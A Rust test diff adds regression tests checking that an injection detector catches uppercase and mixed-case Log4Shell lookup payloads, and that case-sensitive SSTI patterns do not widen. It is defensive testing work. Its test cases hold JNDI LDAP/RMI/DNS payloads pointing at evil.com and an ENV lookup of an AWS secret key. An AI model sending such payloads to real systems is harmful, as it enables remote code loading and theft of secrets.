@@ -408,6 +408,54 @@ fn test_log4shell_detection() {
     );
 }
 
+/// BUG-20261115-030 回归锁：Log4j lookup 名（jndi/env）大小写不敏感——
+/// `${JNDI:LDAP://` / `${ENV:` 大写变体是 CVE-2021-44228 真实攻击演化
+/// 形态（专打小写敏感的 naive 过滤器）。旧行为（pattern 无 (?i)）对
+/// 全大写变体只出 near-zero 分（jndi 0.95 / env 0.85 两条权重失明，
+/// 分类器对纯语法串无信号），任一断言必红。断言走 matched_patterns
+/// （含 regex 原文）而非裸 score——证明命中来自本尊 pattern，不是别的
+/// 规则误配兜底。
+#[test]
+fn test_log4shell_lookup_uppercase_variants_detected() {
+    let detector = Detector::new(InjectionConfig::default());
+    let cases = [
+        ("${JNDI:LDAP://evil.com/exploit}", "jndi"),
+        ("${JNDI:RMI://evil.com/a}", "jndi"),
+        ("${jNdI:dNs://evil.com/a}", "jndi"),
+        ("${ENV:AWS_SECRET_ACCESS_KEY}", "env"),
+        ("${Env:PATH}", "env"),
+        ("write ${env to file", "env"),
+    ];
+    for (payload, family) in cases {
+        let args = serde_json::json!({ "content": payload });
+        let result = detector.analyze_tool_input("write_file", &args);
+        assert!(
+            result
+                .matched_patterns
+                .iter()
+                .any(|p| p.contains(&format!("\\{{{}", family))),
+            "uppercase variant `{payload}` must hit the {family} pattern, matched: {:?}",
+            result.matched_patterns
+        );
+    }
+}
+
+/// 同表横向锁：SSTI（`.class` 等目标语法大小写敏感）与 JS 原型污染
+/// （`constructor` 属性名大小写敏感）保持**窄匹配不误宽**——把它们
+/// 写成大写必须不命中对应 pattern（Python/JS 属性名大小写敏感，
+/// 大写形态不是等价变体；加宽=false-positive 方向漂移）。
+#[test]
+fn test_case_sensitive_syntax_patterns_stay_narrow() {
+    let detector = Detector::new(InjectionConfig::default());
+    let args = serde_json::json!({"content": "{{CONFIG.__CLASS__.__INIT__}}"});
+    let result = detector.analyze_tool_input("write_file", &args);
+    assert!(
+        !result.matched_patterns.iter().any(|p| p.contains("class")),
+        "uppercase Python/JS attribute syntax must NOT hit SSTI/prototype patterns (case-sensitive targets), matched: {:?}",
+        result.matched_patterns
+    );
+}
+
 #[test]
 fn test_ssti_detection() {
     let detector = Detector::new(InjectionConfig::default());
